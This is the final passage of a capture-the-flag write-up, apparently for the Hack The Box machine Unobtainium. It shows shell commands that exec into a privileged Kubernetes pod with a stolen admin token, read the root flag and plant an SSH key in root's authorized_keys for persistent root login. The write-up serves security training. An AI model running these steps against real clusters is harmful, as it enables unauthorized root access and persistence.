<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl <span class="nb">exec </span>evil0xdf <span class="nt">--stdin</span> <span class="nt">--tty</span> <span class="nt">-n</span> kube-system <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt <span class="nt">--</span> /bin/sh
<span class="go">/ # 
</span></code></pre></div></div>

<p>I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/mnt/root #</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">55383ee5************************
</span></code></pre></div></div>

<h3 id="shell-as-root-1">Shell as root</h3>

<p>Despite my efforts to keep my container running, there seems to be a cron killing containers every minute or so. And I want a full shell anyway.</p>

<p>I’ll run the two commands again to recreate and get a shell in the container, and then I’ll write an SSH key. I’ll need to create the <code class="language-plaintext highlighter-rouge">/root/.ssh</code> directory:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ #</span><span class="w"> </span><span class="nb">cd</span> /mnt/root/
<span class="gp">/mnt/root #</span><span class="w"> 
</span><span class="gp">/mnt/root #</span><span class="w"> </span><span class="nb">mkdir</span> .ssh
<span class="gp">/mnt/root #</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;</span> .ssh/authorized_keys
</code></pre></div></div>

<p>Now I can connect as root over SSH:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.10.235
<span class="go">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-70-generic x86_64)
...[snip]...
</span><span class="gp">root@unobtainium:~#</span><span class="w"> 
</span></code></pre></div></div>

      </div>
    </div>
  
  </div><a class="u-url" href="/2021/09/04/htb-unobtainium.html" hidden></a>
</article>

      </div>
    </main>
<footer class="site-footer h-card">

  <div class="wrapper">

    <h2 data-toc-skip class="footer-heading">0xdf hacks stuff</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xdf hacks stuff
</li><li><a class="u-email" href="mailto:0xdf.223@gmail.com">0xdf.223@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.twitter.com/0xdf_"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">0xdf_</span></a></li><!--<li><a href="https://mm.netsecfocus.com/nsf/messages/@oxdf"><img class="svg-icon" src="/assets/icons/mattermost-icon-128.png" alt="NSF" /><span class="username">oxdf</span></a></li>--><li><a href="https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#youtube"></use></svg> <span class="username">0xdf</span></a></li><li><a href="/feed.xml"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#rss"></use></svg> <span>feed</span></a></li><li class="bmc"><a href="https://app.hackthebox.com/users/profile/4935"><img class="svg-icon bmc" src="/assets/icons/htb-favicon.png" alt="HTB" /><span class="username">0xdf</span></a></li><li class="bmc"><a rel="me" href="https://infosec.exchange/@0xdf"><img class="svg-icon bmc" src="/assets/icons/mastodon.svg" alt="Mastodon" /><span class="username">@0xdf@infosec.exchange</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>CTF solutions, malware analysis, home lab development</p>
        <link href="https://fonts.googleapis.com/css?family=Cookie"
rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee"><span style="margin-left:15px;font-size:28px !important;">Buy me a coffee</span></a>
      </div>
    </div>

  </div>


  <script src="/assets/js/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap-toc.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  
  <script src="/assets/js/collapsable.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
<script>
  $(document).ready(function () {
    mermaid.initialize({
      startOnLoad:true,
      theme: "default",
    });
    window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
  });
</script>

  <script src="/assets/js/fix_mermaid.js"></script>


  <!-- Twitter universal website tag code -->
  <script>
    !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
     },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
     a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
    // Insert Twitter Pixel ID and Standard Event data below
    twq('init','o42o1');
    twq('track','PageView');
  </script>
  <!-- End Twitter universal website tag code -->
</footer>
</body>

</html>
